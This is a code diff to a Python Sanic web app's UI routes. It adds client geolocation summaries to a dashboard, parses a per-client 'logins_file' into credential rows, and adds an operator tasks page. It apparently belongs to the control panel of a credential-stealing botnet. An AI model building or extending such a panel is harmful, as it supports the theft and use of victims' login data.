@@ -3,9 +3,10 @@ from sanic_ext import render
 from ..authentication import authenticated, get_authenticated_user
 from ..premissions import Premissions
 from urllib.parse import urlparse
-from ..misc import get_uptime, get_ip_groups, create_ip_groups
+from ..misc import get_uptime, summarize_locations
 from ..models import User, Client, SessionLocal, get_new_clients_count_last_24_hours, get_total_clients_count_last_24_hours
 import asyncio
+import json
 
 ui_bp = Blueprint("ui")
 
@@ -17,10 +18,13 @@ async def dashboard(request: Request):
 
     with SessionLocal() as session:
         users = session.query(User).all()
+        rawLocations = [ c.to_json()["geoloc"] for c in session.query(Client).all()]
+
+    ipLocations = summarize_locations(rawLocations)
 
     return await render("dashboard.html.j2", context={
         "active": "dashboard", "user": user.to_json(), "premissions": Premissions.to_json(),
-        "ipLocations": get_ip_groups()[1], "uptime": get_uptime(), "newClientClounts": get_new_clients_count_last_24_hours(), "users": users})
+        "ipLocations": ipLocations, "uptime": get_uptime(), "newClientClounts": get_new_clients_count_last_24_hours(), "users": users})
 
 @ui_bp.get("/clients")
 async def clients(request: Request):
@@ -64,7 +68,18 @@ async def client(request: Request, id: int):
         if not client:
             raise Exception("Invalid client id!")
 
-    return await render("client.html.j2", context={"active": "BACK", "back_url": back_url, "user": user.to_json(), "premissions": Premissions.to_json(), "client": client.to_json()})
+    logins = []
+    for r in client.logins_file.strip().split('\n'):
+        logins.append(r.split(' ]|[ '))
+
+    return await render("client.html.j2", context={"active": "BACK", "back_url": back_url, "user": user.to_json(), "premissions": Premissions.to_json(), "client": client.to_json(), "logins": logins})
+
+@ui_bp.get("/tasks")
+async def tasks(request: Request):
+    error = authenticated(request, permissions=[Premissions.Operator, Premissions.Configurator], redirect_route="/dashboard")
+    if error: return error
+    user = get_authenticated_user(request)
+    return await render("tasks.html.j2", context={"active": "tasks", "user": user.to_json(), "premissions": Premissions.to_json()})
 
 @ui_bp.get("/settings")
 async def settings(request: Request):
